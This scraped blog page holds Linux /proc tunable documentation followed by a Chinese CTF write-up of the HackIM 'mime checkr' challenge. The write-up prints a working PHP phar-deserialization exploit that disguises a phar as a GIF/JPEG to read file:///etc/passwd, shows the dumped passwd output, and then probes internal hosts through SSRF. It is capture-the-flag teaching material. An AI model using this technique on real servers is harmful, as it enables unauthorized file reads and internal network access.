+<p> These files can be controlled to set the NIS domainname and hostname of your box. For the classic darkstar.frop.org a simple: # echo “darkstar” &gt; /proc/sys/kernel/hostname # echo “frop.org” &gt; /proc/sys/kernel/domainname would suffice to set your hostname and NIS domainname. /proc/sys/kernel/osrelease, /proc/sys/kernel/ostype, /proc/sys/kernel/version The names make it pretty obvious what these fields contain: # cat /proc/sys/kernel/osrelease 2.2.12 # cat /proc/sys/kernel/ostype Linux # cat /proc/sys/kernel/version #4 Fri Oct 1 12:41:14 PDT 1999 The files osrelease and ostype should be clear enough. Version needs a little more clarification. The #4 means that this is the 4th kernel built from this source base and the date after it indicates the time the kernel was built. The only way to tune these values is to rebuild the kernel.</p>
+<p>/proc/sys/kernel/panic</p>
+<p> The value in this file represents the number of seconds the kernel waits before rebooting on a panic. When you use the software watchdog, the recommended setting is 60. If set to 0, the auto reboot after a kernel panic is disabled, which is the default setting.</p>
+<p>/proc/sys/kernel/printk<br>The four values in printk denote <em> console_loglevel, </em> default_message_loglevel, <em> minimum_console_level and </em> default_console_loglevel respectively. These values influence printk() behavior when printing or logging error messages, which come from inside the kernel. See syslog(2) for more information on the different log levels.</p>
+<p>/proc/sys/kernel/console_loglevel</p>
+<p> Messages with a higher priority than this will be printed to the console.</p>
+<p>/proc/sys/kernel/default_message_level</p>
+<p> Messages without an explicit priority will be printed with this priority.</p>
+<p>/proc/sys/kernel/minimum_console_loglevel</p>
+<p> Minimum (highest) value to which the console_loglevel can be set.</p>
+<p>/proc/sys/kernel/default_console_loglevel</p>
+<p> Default value for console_loglevel.</p>
+<p>/proc/sys/kernel/sg-big-buff<br>This file shows the size of the generic SCSI (sg) buffer. At this point, you can’t tune it yet, but you can change it at compile time by editing include/scsi/sg.h and changing the value of SG_BIG_BUFF. If you use a scanner with SANE (Scanner Access Now Easy) you might want to set this to a higher value. Refer to the SANE documentation on this issue.</p>
+<p>/proc/sys/kernel/modprobe<br>The location where the modprobe binary is located. The kernel uses this program to load modules on demand.</p>
+<p>/proc/sys/vm<br>The files in this directory can be used to tune the operation of the virtual memory (VM) subsystem of the Linux kernel. In addition, one of the files (bdflush) has some influence on disk usage.</p>
+<p>nfract<br>This parameter governs the maximum number of dirty buffers in the buffer cache. Dirty means that the contents of the buffer still have to be written to disk (as opposed to a clean buffer, which can just be forgotten about). Setting this to a higher value means that Linux can delay disk writes for a long time, but it also means that it will have to do a lot of I/O at once when memory becomes short. A lower value will spread out disk I/O more evenly.</p>
+<p>ndirty</p>
+<p> Ndirty gives the maximum number of dirty buffers that bdflush can write to the disk at one time. A high value will mean delayed, bursty I/O, while a small value can lead to memory shortage when bdflush isn’t woken up often enough.</p>
+<p>nrefill<br>This is the number of buffers that bdflush will add to the list of free buffers when refill_freelist() is called. It is necessary to allocate free buffers beforehand, since the buffers are often different sizes than the memory pages and some bookkeeping needs to be done beforehand. The higher the number, the more memory will be wasted and the less often refill_freelist() will need to run.</p>
+<p>nref_dirt<br>When refill_freelist() comes across more than nref_dirt dirty buffers, it will wake up bdflush.</p>
+<p>age_buffer, age_super<br>Finally, the age_buffer and age_super parameters govern the maximum time Linux waits before writing out a dirty buffer to disk. The value is expressed in jiffies (clockticks), the number of jiffies per second is 100. Age_buffer is the maximum age for data blocks, while age_super is for filesystems meta data.</p>
+<p>buffermem<br>The three values in this file control how much memory should be used for buffer memory. The percentage is calculated as a percentage of total system memory.</p>
+<p>The values are:</p>
+<p>min_percent<br>This is the minimum percentage of memory that should be spent on buffer memory.</p>
+<p>borrow_percent</p>
+<p> When Linux is short on memory, and the buffer cache uses more than it has been allotted, the memory management (MM) subsystem will prune the buffer cache more heavily than other memory to compensate.</p>
+<p>max_percent<br>This is the maximum amount of memory that can be used for buffer memory.</p>
+<p>freepages<br>This file contains three values: min, low and high:</p>
+<p>min<br>When the number of free pages in the system reaches this number, only the kernel can allocate more memory.</p>
+<p>low<br>If the number of free pages falls below this point, the kernel starts swapping aggressively.</p>
+<p>high</p>
+<p> The kernel tries to keep up to this amount of memory free; if memory falls below this point, the kernel starts gently swapping in the hopes that it never has to do really aggressive swapping.</p>
+<p>kswapd<br>Kswapd is the kernel swap out daemon. That is, kswapd is that piece of the kernel that frees memory when it gets fragmented or full. Since every system is different, you’ll probably want some control over this piece of the system.</p>
+<p>The file contains three numbers:</p>
+<p>tries_base<br>The maximum number of pages kswapd tries to free in one round is calculated from this number. Usually this number will be divided by 4 or 8 (see mm/vmscan.c), so it isn’t as big as it looks. When you need to increase the bandwidth to/from swap, you’ll want to increase this number.</p>
+<p>tries_min<br>This is the minimum number of times kswapd tries to free a page each time it is called. Basically it’s just there to make sure that kswapd frees some pages even when it’s being called with minimum priority.</p>
+<p>swap_cluster<br>This is probably the greatest influence on system performance. swap_cluster is the number of pages kswapd writes in one turn. You’ll want this value to be large so that kswapd does its I/O in large chunks and the disk doesn’t have to seek as often, but you don’t want it to be too large since that would flood the request queue.</p>
+<p>overcommit_memory<br>This file contains one value. The following algorithm is used to decide if there’s enough memory: if the value of overcommit_memory is positive, then there’s always enough memory. This is a useful feature, since programs often malloc() huge amounts of memory ‘just in case’, while they only use a small part of it. Leaving this value at 0 will lead to the failure of such a huge malloc(), when in fact the system has enough memory for the program to run. On the other hand, enabling this feature can cause you to run out of memory and thrash the system to death, so large and/or important servers will want to set this value to 0.</p>
+<p>pagecache<br>This file does exactly the same job as buffermem, only this file controls the amount of memory allowed for memory mapping and generic caching of files. You don’t want the minimum level to be too low, otherwise your system might thrash when memory is tight or fragmentation is high.</p>
+<p>pagetable_cache<br>The kernel keeps a number of page tables in a per-processor cache (this helps a lot on SMP systems). The cache size for each processor will be between the low and the high value. On a low-memory, single CPU system, you can safely set these values to 0 so you don’t waste memory. It is used on SMP systems so that the system can perform fast pagetable allocations without having to acquire the kernel memory lock. For large systems, the settings are probably fine. For normal systems they won’t hurt a bit. For small systems ( less than 16MB ram) it might be advantageous to set both values to 0.</p>
+<p>swapctl<br>This file contains no less than 8 variables. All of these values are used by kswapd. The first four variables sc_max_page_age, sc_page_advance, sc_page_decline and sc_page_initial_age are used to keep track of Linux’s page aging. Page ageing is a bookkeeping method to track which pages of memory are often used, and which pages can be swapped out without consequences.</p>
+<p>When a page is swapped in, it starts at sc_page_initial_age (default 3) and when the page is scanned by kswapd, its age is adjusted according to the following scheme.</p>
+<p>If the page was used since the last time we scanned, its age is increased by sc_page_advance (default 3). Where the maximum value is given by sc_max_page_age (default 20). Otherwise (meaning it wasn’t used) its age is decreased by sc_page_decline (default 1).</p>
+<p>When a page reaches age 0, it’s ready to be swapped out.</p>
+<p>The variables sc_age_cluster_fract, sc_age_cluster_min, sc_pageout_weight and sc_bufferout_weight, can be used to control kswapd’s aggressiveness in swapping out pages.</p>
+<p>Sc_age_cluster_fract is used to calculate how many pages from a process are to be scanned by kswapd. The formula used is</p>
+<p>(sc_age_cluster_fract divided by 1024) times resident set size</p>
+<p>So if you want kswapd to scan the whole process, sc_age_cluster_fract needs to have a value of 1024. The minimum number of pages kswapd will scan is represented by sc_age_cluster_min, which is done so that kswapd will also scan small processes. The values of sc_pageout_weight and sc_bufferout_weight are used to control how many tries kswapd will make in order to swap out one page/buffer. These values can be used to fine-tune the ratio between user pages and buffer/cache memory. When you find that your Linux system is swapping out too many process pages in order to satisfy buffer memory demands, you may want to either increase sc_bufferout_weight, or decrease the value of sc_pageout_weight.</p>
+<p>/proc/sys/dev<br>Device specific parameters. Currently there is only support for CDROM drives, and for those, there is only one read-only file containing information about the CD-ROM drives attached to the system: &gt;cat /proc/sys/dev/cdrom/info CD-ROM information, Id: cdrom.c 2.55 1999/04/25 drive name: sr0 hdb drive speed: 32 40 drive # of slots: 1 0 Can close tray: 1 1 Can open tray: 1 1 Can lock tray: 1 1 Can change speed: 1 1 Can select disk: 0 1 Can read multisession: 1 1 Can read MCN: 1 1 Reports media changed: 1 1 Can play audio: 1 1 You see two drives, sr0 and hdb, along with a list of their features.</p>
+<p>SUNRPC<br>/proc/sys/sunrpc</p>
+<p> This directory contains four files, which enable or disable debugging for the RPC functions NFS, NFS-daemon, RPC and NLM. The default values are 0. They can be set to one to turn debugging on. (The default value is 0 for each)</p>
+<p>/proc/sys/net</p>
+<p> The interface to the networking parts of the kernel is located in /proc/sys/net. The following table shows all possible subdirectories. You may see only some of them, depending on your kernel’s configuration. Our main focus will be on IP networking since AX15, X.25, and DEC Net are only minor players in the Linux world. Should you wish review the online documentation and the kernel source to get a detailed view of the parameters for those protocols not covered here. In this section we’ll discuss the subdirectories listed above. As default values are suitable for most needs, there is no need to change these values.</p>
+<p>GENERAL PARAMETERS<br>/proc/sys/net/core</p>
+<p> Network core options</p>
+<p>rmem_default<br>The default setting of the socket receive buffer in bytes.</p>
+<p>rmem_max<br>The maximum receive socket buffer size in bytes.</p>
+<p>wmem_default<br>The default setting (in bytes) of the socket send buffer.</p>
+<p>wmem_max<br>The maximum send socket buffer size in bytes.</p>
+<p>message_burst and message_cost</p>
+<p> These parameters are used to limit the warning messages written to the kernel log from the networking code. They enforce a rate limit to make a denial-of-service attack impossible. A higher message_cost factor, results in fewer messages that will be written. Message_burst controls when messages will be dropped. The default settings limit warning messages to one every five seconds.</p>
+<p>netdev_max_backlog</p>
+<p> Maximum number of packets, queued on the INPUT side, when the interface receives packets faster than kernel can process them.</p>
+<p>optmem_max<br>Maximum ancillary buffer size allowed per socket. Ancillary data is a sequence of struct cmsghdr structures with appended data.</p>
+<p>UNIX DOMAIN SOCKETS<br>/proc/sys/net/unix</p>
+<p> Parameters for Unix domain sockets</p>
+<p>There are only two files in this subdirectory. They control the delays for deleting and destroying socket descriptors.</p>
+<p>IPv4<br>/proc/sys/net/ipv4<br>IPV4 settings. IP version 4 is still the most used protocol in Unix networking. It will be replaced by IP version 6 in the next couple of years, but for the moment it’s the de facto standard for the internet and is used in most networking environments around the world. Because of the importance of this protocol, we’ll have a deeper look into the subtree controlling the behavior of the Ipv4 subsystem of the Linux kernel.</p>
+<p>Let’s start with the entries in /proc/sys/net/ipv4.</p>
+<p>ICMP settings<br>icmp_echo_ignore_all and icmp_echo_ignore_broadcasts<br>Turn on (1) or off (0), if the kernel should ignore all ICMP ECHO requests, or just those to broadcast and multicast addresses.</p>
+<p>Please note that if you accept ICMP echo requests with a broadcast/multi-cast destination address your network may be used as an exploder for denial of service packet flooding attacks to other hosts.</p>
+<p>icmp_destunreach_rate, icmp_echoreply_rate, icmp_paramprob_rate and icmp_timeexeed_rate</p>
+<p> Sets limits for sending ICMP packets to specific targets. A value of zero disables all limiting. Any positive value sets the maximum package rate in hundredth of a second (on Intel systems).</p>
+<p>IP settings<br>ip_autoconfig<br>This file contains the number one if the host received its IP configuration by RARP, BOOTP, DHCP or a similar mechanism. Otherwise it is zero.</p>
+<p>ip_default_ttl<br>TTL (Time To Live) for IPv4 interfaces. This is simply the maximum number of hops a packet may travel.</p>
+<p>ip_dynaddr</p>
+<p> Enable dynamic socket address rewriting on interface address change. This is useful for dialup interface with changing IP addresses.</p>
+<p>ip_forward<br>Enable or disable forwarding of IP packages between interfaces. Changing this value resets all other parameters to their default values. They differ if the kernel is configured as host or router.</p>
+<p>ip_local_port_range<br>Range of ports used by TCP and UDP to choose the local port. Contains two numbers, the first number is the lowest port, the second number the highest local port. Default is 1024-4999. Should be changed to 32768-61000 for high-usage systems.</p>
+<p>ip_no_pmtu_disc</p>
+<p> Global switch to turn path MTU discovery off. It can also be set on a per socket basis by the applications or on a per route basis.</p>
+<p>ip_masq_debug<br>Enable/disable debugging of IP masquerading.</p>
+<p>IP fragmentation settings<br>ipfrag_high_trash and ipfrag_low_trash<br>Maximum memory used to reassemble IP fragments. When ipfrag_high_thrash bytes of memory is allocated for this purpose, the fragment handler will toss packets until ipfrag_low_thrash is reached.</p>
+<p>ipfrag_time</p>
+<p> Time in seconds to keep an IP fragment in memory.</p>
+<p>TCP settings<br>tcp_ecn</p>
+<p> This file controls the use of the ECN bit in the IPv4 headers, this is a new feature about Explicit Congestion Notification, but some routers and firewalls block traffic that has this bit set, so it could be necessary to echo 0 to /proc/sys/net/ipv4/tcp_ecn, if you want to talk to this sites. For more info you could read RFC2481.</p>
+<p>tcp_retrans_collapse<br>Bug-to-bug compatibility with some broken printers. On retransmit, try to send larger packets to work around bugs in certain TCP stacks. Can be turned off by setting it to zero.</p>
+<p>tcp_keepalive_probes<br>Number of keep alive probes TCP sends out, until it decides that the connection is broken.</p>
+<p>tcp_keepalive_time</p>
+<p> How often TCP sends out keep alive messages, when keep alive is enabled. The default is 2 hours.</p>
+<p>tcp_syn_retries<br>Number of times initial SYNs for a TCP connection attempt will be retransmitted. Should not be higher than 255. This is only the timeout for outgoing connections, for incoming connections the number of retransmits is defined by tcp_retries1.</p>
+<p>tcp_sack<br>Enable select acknowledgments after RFC2018.</p>
+<p>tcp_timestamps<br>Enable timestamps as defined in RFC1323.</p>
+<p>tcp_stdurg<br>Enable the strict RFC793 interpretation of the TCP urgent pointer field. The default is to use the BSD compatible interpretation of the urgent pointer pointing to the first byte after the urgent data. The RFC793 interpretation is to have it point to the last byte of urgent data. Enabling this option may lead to interoperability problems. Disabled by default.</p>
+<p>tcp_syncookies<br>Only valid when the kernel was compiled with CONFIG_SYNCOOKIES. Send out syncookies when the syn backlog queue of a socket overflows. This is to ward off the common ‘syn flood attack’. Disabled by default. Note that the concept of a socket backlog is abandoned. This means the peer may not receive reliable error messages from an over loaded server with syncookies enabled.</p>
+<p>tcp_window_scaling<br>Enable window scaling as defined in RFC1323.</p>
+<p>tcp_fin_timeout<br>The length of time in seconds it takes to receive a final FIN before the socket is always closed. This is strictly a violation of the TCP specification, but required to prevent denial-of-service attacks.</p>
+<p>tcp_max_ka_probes<br>Indicates how many keep alive probes are sent per slow timer run. Should not be set too high to prevent bursts.</p>
+<p>tcp_max_syn_backlog<br>Length of the per socket backlog queue. Since Linux 2.2 the backlog specified in listen(2) only specifies the length of the backlog queue of already established sockets. When more connection requests arrive Linux starts to drop packets. When syncookies are enabled the packets are still answered and the maximum queue is effectively ignored.</p>
+<p>tcp_retries1<br>Defines how often an answer to a TCP connection request is retransmitted before giving up.</p>
+<p>tcp_retries2<br>Defines how often a TCP packet is retransmitted before giving up.</p>
+<p>/proc/sys/net/ipv4/conf<br>Here you’ll find one subdirectory for each interface the system knows about and one directory called all. Changes in the all subdirectory affect all interfaces, whereas changes in the other subdirectories affect only one interface. All directories have the same entries:</p>
+<p>accept_redirects<br>This switch decides if the kernel accepts ICMP redirect messages or not. The default is ‘yes’ if the kernel is configured for a regular host and ‘no’ for a router configuration.</p>
+<p>accept_source_route<br>Should source routed packages be accepted or declined. The default is dependent on the kernel configuration. It’s ‘yes’ for routers and ‘no’ for hosts.</p>
+<p>bootp_relay</p>
+<p> Accept packets with source address 0.b.c.d with destinations not to this host as local ones. It is supposed that a BOOTP relay daemon will catch and forward such packets. The default is 0.</p>
+<p>forwarding<br>Enable or disable IP forwarding on this interface.</p>
+<p>log_martians<br>Log packets with source addresses with no known route to kernel log.</p>
+<p>mc_forwarding<br>Do multicast routing. The kernel needs to be compiled with CONFIG_MROUTE and a multicast routing daemon is required.</p>
+<p>proxy_arp<br>Does (1) or does not (0) perform proxy ARP.</p>
+<p>rp_filter<br>Integer value determines if a source validation should be made. 1 means yes, 0 means no. Disabled by default, but local/broadcast address spoofing is always on. If you set this to 1 on a router that is the only connection for a network to the net, it will prevent spoofing attacks against your internal networks (external addresses can still be spoofed), without the need for additional firewall rules.</p>
+<p>secure_redirects<br>Accept ICMP redirect messages only for gateways, listed in default gateway list. Enabled by default.</p>
+<p>shared_media</p>
+<p> If it is not set the kernel does not assume that different subnets on this device can communicate directly. Default setting is ‘yes’.</p>
+<p>send_redirects<br>Determines whether to send ICMP redirects to other hosts.</p>
+<p>Routing settings<br>The directory /proc/sys/net/ipv4/route contains several file to control routing issues.</p>
+<p>error_burst and error_cost<br>These parameters are used to limit the warning messages written to the kernel log from the routing code. The higher the error_cost factor is, the fewer messages will be written. Error_burst controls when messages will be dropped. The default settings limit warning messages to one every five seconds.</p>
+<p>flush</p>
+<p> Writing to this file results in a flush of the routing cache.</p>
+<p>gc_elastic, gc_interval, gc_min_interval, gc_tresh, gc_timeout<br>Values to control the frequency and behavior of the garbage collection algorithm for the routing cache.</p>
+<p>max_size<br>Maximum size of the routing cache. Old entries will be purged once the cache reached has this size.</p>
+<p>max_delay, min_delay<br>Delays for flushing the routing cache.</p>
+<p>redirect_load, redirect_number</p>
+<p> Factors which determine if more ICPM redirects should be sent to a specific host. No redirects will be sent once the load limit or the maximum number of redirects has been reached.</p>
+<p>redirect_silence<br>Timeout for redirects. After this period redirects will be sent again, even if this has been stopped, because the load or number limit has been reached.</p>
+<p>/proc/sys/net/ipv4/neigh<br>Network Neighbor handling. It contains settings about how to handle connections with direct neighbors (nodes attached to the same link). As we saw it in the conf directory, there is a default subdirectory which holds the default values, and one directory for each interface. The contents of the directories are identical, with the single exception that the default settings contain additional options to set garbage collection parameters.</p>
+<p>In the interface directories you’ll find the following entries:</p>
+<p>base_reachable_time<br>A base value used for computing the random reachable time value as specified in RFC2461.</p>
+<p>retrans_time<br>The time, expressed in jiffies (1/100 sec), between retransmitted Neighbor Solicitation messages. Used for address resolution and to determine if a neighbor is unreachable.</p>
+<p>unres_qlen</p>
+<p> Maximum queue length for a pending arp request - the number of packets which are accepted from other layers while the ARP address is still resolved.</p>
+<p>anycast_delay<br>Maximum for random delay of answers to neighbor solicitation messages in jiffies (1/100 sec). Not yet implemented (Linux does not have anycast support yet).</p>
+<p>ucast_solicit<br>Maximum number of retries for unicast solicitation.</p>
+<p>mcast_solicit<br>Maximum number of retries for multicast solicitation.</p>
+<p>delay_first_probe_time<br>Delay for the first time probe if the neighbor is reachable. (see gc_stale_time)</p>
+<p>locktime<br>An ARP/neighbor entry is only replaced with a new one if the old is at least locktime old. This prevents ARP cache thrashing.</p>
+<p>proxy_delay<br>Maximum time (real time is random [0..proxytime]) before answering to an ARP request for which we have an proxy ARP entry. In some cases, this is used to prevent network flooding.</p>
+<p>proxy_qlen</p>
+<p> Maximum queue length of the delayed proxy arp timer. (see proxy_delay).</p>
+<p>app_solcit<br>Determines the number of requests to send to the user level ARP daemon. Use 0 to turn off.</p>
+<p>gc_stale_time<br>Determines how often to check for stale ARP entries. After an ARP entry is stale it will be resolved again (which is useful when an IP address migrates to another machine). When ucast_solicit is greater than 0 it first tries to send an ARP packet directly to the known host When that fails and mcast_solicit is greater than 0, an ARP request is broadcasted.</p>
+<p>APPLETALK<br>/proc/sys/net/appletalk</p>
+<p> Holds the Appletalk configuration data when Appletalk is loaded. The configurable parameters are:</p>
+<p>aarp-expiry-time</p>
+<p> The amount of time we keep an ARP entry before expiring it. Used to age out old hosts.</p>
+<p>aarp-resolve-time</p>
+<p> The amount of time we will spend trying to resolve an Appletalk address.</p>
+<p>aarp-retransmit-limit</p>
+<p> The number of times we will retransmit a query before giving up.</p>
+<p>aarp-tick-time</p>
+<p> Controls the rate at which expires are checked.</p>
+<p>/proc/net/appletalk<br>Holds the list of active Appletalk sockets on a machine. The fields indicate the DDP type, the local address (in network:node format) the remote address, the size of the transmit pending queue, the size of the received queue (bytes waiting for applications to read) the state and the uid owning the socket.</p>
+<p>/proc/net/atalk_iface<br>lists all the interfaces configured for appletalk. It shows the name of the interface, its Appletalk address, the network range on that address (or network number for phase 1 networks), and the status of the interface.</p>
+<p>/proc/net/atalk_route<br>lists each known network route. It lists the target (network) that the route leads to, the router (may be directly connected), the route flags, and the device the route is using.</p>
+<p>IPX<br>The IPX protocol has no tunable values in proc/sys/net, it does, however, provide proc/net/ipx. This lists each IPX socket giving the local and remote addresses in Novell format (that is network:node:port). In accordance with the strange Novell tradition, everything but the port is in hex. Not_Connected is displayed for sockets that are not tied to a specific remote address. The Tx and Rx queue sizes indicate the number of bytes pending for transmission and reception. The state indicates the state the socket is in and the uid is the owning uid of the socket.</p>
+<p>ipx_interface<br>Lists all IPX interfaces. For each interface it gives the network number, the node number, and indicates if the network is the primary network. It also indicates which device it is bound to (or Internal for internal networks) and the Frame Type if appropriate. Linux supports 802.3, 802.2, 802.2 SNAP and DIX (Blue Book) ethernet framing for IPX.</p>
+<p>ipx_route<br>Table holding a list of IPX routes. For each route it gives the destination network, the router node (or Directly) and the network address of the router (or Connected) for internal networks.</p>
+<p>/proc/sysvipc<br>Info of SysVIPC Resources (msg, sem, shm) (2.4)</p>
+<p>/proc/tty<br>Information about the available and actually used tty’s can be found in the directory /proc/tty. You’ll find entries for drivers and line disciplines in this directory.</p>
+<p>/proc/tty/drivers</p>
+<p> list of drivers and their usage.</p>
+<p>/proc/tty/ldiscs<br>registered line disciplines.</p>
+<p>/proc/tty/driver/serial</p>
+<p> usage statistic and status of single tty lines.</p>
+<p>To see which tty’s are currently in use, you can simply look into the file /proc/tty/drivers:</p>
+<pre><code># cat /proc/tty/drivers
+serial   /dev/cua5  64-127 serial:callout
+serial   /dev/ttyS   4  64-127 serial
+pty_slave/dev/pts  143   0-255 pty:slave
+pty_master   /dev/ptm  135   0-255 pty:master
+pty_slave/dev/pts  142   0-255 pty:slave
+pty_master   /dev/ptm  134   0-255 pty:master
+pty_slave/dev/pts  141   0-255 pty:slave
+pty_master   /dev/ptm  133   0-255 pty:master
+pty_slave/dev/pts  140   0-255 pty:slave
+pty_master   /dev/ptm  132   0-255 pty:master
+pty_slave/dev/pts  139   0-255 pty:slave
+pty_master   /dev/ptm  131   0-255 pty:master
+pty_slave/dev/pts  138   0-255 pty:slave
+pty_master   /dev/ptm  130   0-255 pty:master
+pty_slave/dev/pts  137   0-255 pty:slave
+pty_master   /dev/ptm  129   0-255 pty:master
+pty_slave/dev/pts  136   0-255 pty:slave
+pty_master   /dev/ptm  128   0-255 pty:master
+pty_slave/dev/ttyp   3   0-255 pty:slave
+pty_master   /dev/pty2   0-255 pty:master
+/dev/vc/0/dev/vc/0   4   0 system:vtmaster
+/dev/ptmx/dev/ptmx   5   2 system
+/dev/console /dev/console5   1 system:console
+/dev/tty /dev/tty5   0 system:/dev/tty
+unknown  /dev/vc/%d  41-63 console
+</code></pre><p>Note that while the above files tend to be easily readable text files, they can sometimes be formatted in a way that is not easily digestible. There are many commands that do little more than read the above files and format them for easier understanding. For example, the free program reads /proc/meminfo and converts the amounts given in bytes to kilobytes (and adds a little more information, as well).</p>
+<p>/proc/uptime<br>The time the system has been up.</p>
+<p>/proc/version</p>
+<p> The kernel version.</p>
+<p>/proc/video<br>BTTV info of video resources.</p>
+<p>Prev    Home    Next<br>/opt    Up    /root</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/proc/">/proc</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2019/03/26/CTF/hackim ctf/"><span>hackim web</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/03/26/CTF/hackim ctf/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-03-26T14:59:10.103Z">
+          2019-03-26
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="hackim-web"><a href="#hackim-web" class="headerlink" title="hackim web"></a>hackim web</h1><h2 id="escape"><a href="#escape" class="headerlink" title="escape"></a>escape</h2><h2 id="rfv"><a href="#rfv" class="headerlink" title="rfv"></a>rfv</h2><p>查看响应信息发现字段<code>X-Powered-By</code>，其对应的为<code>express</code><br>可知为后端为nodejs</p>
+<h2 id="mime-checkr"><a href="#mime-checkr" class="headerlink" title="mime checkr"></a>mime checkr</h2><p>只能上传<code>.jpeg</code>格式图片，有一个类型检查的功能<br>这里有很重要的一点，一个<code>getmime.bak</code>的备份源码文件（不看writeup我是肯定不知道的，orz）</p>
+<pre><code>&lt;?php
+//error_reporting(-1);
+//ini_set(&apos;display_errors&apos;, &apos;On&apos;);
+
+class CurlClass{
+public function httpGet($url) {
+$ch = curl_init();  
+
+curl_setopt($ch,CURLOPT_URL,$url);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+//  curl_setopt($ch,CURLOPT_HEADER, false); 
+
+$output=curl_exec($ch);
+
+curl_close($ch);
+return $output;
+ }
+}
+
+
+class MainClass {
+
+    public function __destruct() {
+$this-&gt;why =new CurlClass;
+echo $this-&gt;url;
+echo $this-&gt;why-&gt;httpGet($this-&gt;url);
+    }
+}
+
+
+// Check if image file is a actual image or fake image
+if(isset($_POST[&quot;submit&quot;])) {
+$check = getimagesize($_POST[&apos;name&apos;]);
+if($check !== false) {
+echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;
+$uploadOk = 1;
+} else {
+echo &quot;File is not an image.&quot;;
+$uploadOk = 0;
+}
+}
+
+
+?&gt;
+</code></pre><p>看到<strong>MainClass</strong>中的<code>__destruct()</code>，就明白要反序列化了，由此想到phar协议的利用</p>
+<pre><code>&lt;?php
+
+class CurlClass
+{
+public function httpGet($url)
+{
+$ch = curl_init();
+
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+//  curl_setopt($ch,CURLOPT_HEADER, false); 
+
+$output = curl_exec($ch);
+
+curl_close($ch);
+return $output;
+}
+}
+
+
+class MainClass
+{
+
+public function __destruct()
+{
+$this-&gt;why = new CurlClass;
+echo $this-&gt;url;
+echo $this-&gt;why-&gt;httpGet($this-&gt;url);
+}
+}
+
+$phar = new Phar(&quot;zedd.phar&quot;); //后缀名必须为phar
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot; . &quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+$o = new MainClass();
+$o-&gt;url = &quot;file:///etc/passwd&quot;;
+$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); 
+//签名自动计算
+$phar-&gt;stopBuffering();
+?&gt;
+</code></pre><p>生成一个phar文件，将后缀改为<code>.jpeg</code>,上传，然后<code>phar://uploads/&lt;name.jpeg&gt;/test.txt</code>,成功返回</p>
+<blockquote>
+<p>HTTP/1.1 200 OK<br>Date: Sun, 31 Mar 2019 10:20:41 GMT<br>Server: Apache/2.4.7 (Ubuntu)<br>X-Powered-By: PHP/5.5.9-1ubuntu4.27<br>Vary: Accept-Encoding<br>Content-Length: 1003<br>Connection: close<br>Content-Type: text/html</p>
+<p>File is not an image.</p>
+<p>file:///etc/passwdroot:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>libuuid:x:100:101::/var/lib/libuuid:<br>syslog:x:101:104::/home/syslog:/bin/false</p>
+</blockquote>
+<p>尝试访问/etc/hosts，发现了一个<strong>172.21.0.2</strong>的地址，于是访问，发现无回显，然后再探测<strong>172.21.0.3</strong>主机，返回了信息：</p>
+<blockquote>
+<p><a href="http://172.21.0.3b&#39;\xc8\x85\x93\x93\x96@a\x86\x85\xa3\x83\x88\xa1l\xad\xbd_|]M@@\x94\x85" target="_blank" rel="noopener">http://172.21.0.3b&#39;\xc8\x85\x93\x93\x96@a\x86\x85\xa3\x83\x88\xa1l\xad\xbd_|]M@@\x94\x85</a>‘</p>
+</blockquote>
+<p>一个神奇的编码，<a href="https://en.wikipedia.org/wiki/EBCDIC_1047" target="_blank" rel="noopener">EBCDIC_1047</a>，这个我真没见过<br>利用python的EBCDIC库进行解码</p>
+<pre><code>import ebcdic
+blob=b&apos;xc8x85x93x93x96@ax86x85xa3x83x88xa1lxadxbd_|]M@@x94x85&apos;
+print(blob.decode(&quot;cp1047&quot;))
+</code></pre><p>由于我电脑的问题，所以字符集显示的不正常，解码的正常值是</p>
+<blockquote>
+<p>Hello /fetch~%[]^@)( me</p>
+</blockquote>
+<p>于是再构造<code>http://172.21.0.3/fetch~%[]^@)(</code>,再次得到一个类似的编码，将其解密，则得到flag</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/CTF/">CTF</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2019/03/25/vulnerable/xxe/"><span>xxe</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
